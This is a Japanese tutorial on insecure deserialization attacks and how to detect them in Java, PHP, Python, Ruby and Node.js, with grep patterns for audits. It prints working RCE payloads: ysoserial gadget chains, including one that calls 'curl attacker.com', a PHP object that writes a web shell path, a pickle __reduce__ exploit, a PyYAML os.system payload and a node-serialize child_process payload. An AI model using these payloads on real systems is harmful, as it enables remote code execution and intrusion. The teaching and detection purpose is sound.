Deserialization Attacks

Unsafe deserialization は RCE に直結する Critical 脆弱性。Java / PHP / Python / Ruby / Node.js の各言語における攻撃手法と Detection 方法。

Theory Hands-on

概要: なぜ Deserialization が危険なのか

Serialization = オブジェクトをバイト列/文字列に変換。Deserialization = その逆。

問題: deserialization 時にオブジェクトのコンストラクタやマジックメソッドが自動実行される言語がある。攻撃者が serialized data を制御できれば、任意のオブジェクトを生成させ、RCE に到達できる。

OWASP A8:2017 / CWE-502

Insecure Deserialization は CVSS 9.8 (Critical) クラスの脆弱性。発見 = 即 High/Critical report。

Java: ObjectInputStream

基本的な攻撃

// 危険: untrusted data を ObjectInputStream で読み込み
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // RCE!

// readObject() が呼ばれた時点で、
// オブジェクトの readObject() / readResolve() が自動実行される

Gadget Chains

Classpath に存在するライブラリの既存クラスを連鎖的に悪用して RCE を達成する。

ysoserial

# ysoserial: Java deserialization exploit 生成ツール
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
java -jar ysoserial.jar CommonsCollections5 "curl attacker.com" > payload.bin

# payload を Base64 encode して送信
cat payload.bin | base64 | curl -X POST -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @- http://target/api/endpoint

Detection (grep)

rg -n "ObjectInputStream|readObject\(\)|readUnshared\(\)" --type java
rg -n "XMLDecoder|XStream" --type java
rg -n "fromXML\(|unmarshal\(" --type java

Magic Bytes

Java serialized data は AC ED 00 05 (hex) / rO0AB (Base64) で始まる。HTTP response/request でこのパターンを見たら即注目。

PHP: unserialize()

POP Chains (Property-Oriented Programming)

// PHP magic methods が deserialization 時に呼ばれる:
// __wakeup() - unserialize() 直後
// __destruct() - オブジェクト破棄時
// __toString() - 文字列変換時

// 危険: user input を unserialize
$data = unserialize($_POST['data']);

// Attack: __destruct で file_put_contents を呼ぶクラスを利用
// O:8:"LogClass":1:{s:8:"filename";s:18:"/var/www/shell.php";}

Phar Deserialization

// phar:// wrapper 経由で unserialize が trigger される
// file_exists(), is_file() 等のファイル操作関数が trigger

file_exists("phar://user_upload.phar");  // unserialize 発動!

// 条件: ユーザがファイルアップロード可能 + file operation に phar path が渡せる

Detection (grep)

rg -n "unserialize\(" --type php
rg -n "phar://" --type php
rg -n "__wakeup|__destruct|__toString" --type php  # gadget 候補

Python: pickle / yaml

# pickle: __reduce__ で任意コマンド実行
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# このpayload を target に送り、pickle.loads() させれば RCE

# yaml: !!python/object で任意クラスをインスタンス化
# PyYAML < 6.0 の yaml.load() (Loader 未指定) で発火
payload = """
!!python/object/apply:os.system
- "id"
"""

Detection

rg -n "pickle\.(loads|load)\(|cPickle\." --type py
rg -n "yaml\.(load|unsafe_load)\(" --type py
rg -n "shelve\.open\(|marshal\.loads\(" --type py
rg -n "jsonpickle\.decode\(" --type py
Python の安全な代替

pickle → json (構造化データのみ)。yaml.load → yaml.safe_load。untrusted data の deserialization は原則不可。

Ruby: Marshal.load

# Ruby Marshal.load は pickle 同様に危険
data = params[:session_data]
obj = Marshal.load(Base64.decode64(data))  # RCE!

# Universal Deserialisation Gadget (ERB + method_missing chain)
# Rails アプリでは ActiveSupport の constantize も注意

# Detection:
# Marshal.load, YAML.load (Psych < 4.0), JSON.parse (type handling)

Detection (grep)

rg -n "Marshal\.load\(|Marshal\.restore\(" --type ruby
rg -n "YAML\.load\(" --type ruby  # YAML.safe_load との比較
rg -n "constantize|safe_constantize" --type ruby

Node.js: node-serialize / Prototype-based

// node-serialize: serialize/unserialize で関数実行
const serialize = require('node-serialize');
const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}';
serialize.unserialize(payload);  // RCE!

// cryo: serialize で prototype chain を操作
// funcster: 関数の serialize/deserialize

// 現代の Node.js では直接的な deserialization RCE は稀
// 代わりに Prototype Pollution 経由の gadget chain が主流

Detection (grep)

rg -n "node-serialize|serialize\.unserialize\(" --type js
rg -n "cryo|funcster" --type js
rg -n "\.deserialize\(|\.unmarshal\(" --type js

Key Takeaways

  • Deserialization + untrusted input = Critical RCE — 見つけたら即 High/Critical report
  • Java: ObjectInputStream + classpath の gadget chain。ysoserial でペイロード生成
  • PHP: unserialize() + magic methods + POP chains。phar:// wrapper にも注意
  • Python: pickle.loads + __reduce__。yaml.load (Loader なし) も同等
  • Ruby: Marshal.load。Rails の YAML.load / constantize
  • Detection: magic bytes (rO0AB), Content-Type header, Base64 blob in cookies
  • OSS whitebox audit ではgrep で sink 一発で見つかることが多い
